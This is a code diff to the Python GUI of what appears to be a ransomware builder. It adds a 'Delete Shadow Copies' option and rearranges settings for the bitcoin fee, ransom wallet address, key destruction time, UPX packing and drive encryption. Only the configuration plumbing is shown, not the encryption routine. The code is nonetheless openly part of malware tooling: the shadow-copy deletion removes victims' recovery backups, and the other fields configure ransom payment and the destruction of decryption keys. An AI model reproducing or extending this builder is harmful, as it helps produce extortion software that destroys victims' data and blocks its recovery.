@@ -112,11 +112,12 @@ class Gui(MainFrame):
             self.UpxDirPicker.SetPath(config_dict["upx_dir"])
         else:
             self.UpxDirPicker.SetPath("")
-        # Bitcoin Fee
-        if "bitcoin_fee" in config_dict:
-            self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
-        else:
-            self.BitcoinFeeTextCtrl.SetValue("")
+        # Delete Shadow Copies
+        if "delete_shadow_copies" in config_dict:
+            if config_dict["delete_shadow_copies"]:
+                self.DeleteShadowCopiesCheckbox.SetValue(True)
+            else:
+                self.DeleteShadowCopiesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["delete_shadow_copies"]["default"])
         # Key Destruction time
         if "key_destruction_time" in config_dict:
             self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
@@ -127,6 +128,11 @@ class Gui(MainFrame):
             self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
         else:
             self.WalletAddressTextCtrl.SetValue("")
+        # Bitcoin Fee
+        if "bitcoin_fee" in config_dict:
+            self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
+        else:
+            self.BitcoinFeeTextCtrl.SetValue("")
         # Encrypt Attached Drives
         if "encrypt_attached_drives" in config_dict:
             if config_dict["encrypt_attached_drives"]:
@@ -399,12 +405,14 @@ class Gui(MainFrame):
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
         # UPX Packer Dir
         user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
-        # Bitcoin Fee
-        user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
+        # Delete Shadow Copies
+        user_input_dict["delete_shadow_copies"] = self.DeleteShadowCopiesCheckbox.IsChecked()
         # Key Destruction Time
         user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
         # Wallet Address
         user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
+        # Bitcoin Fee
+        user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
         # Encrypt Attached Drives
         user_input_dict["encrypt_attached_drives"] = self.EncryptAttachedDrivesCheckbox.IsChecked()
         # Encrypt User Home
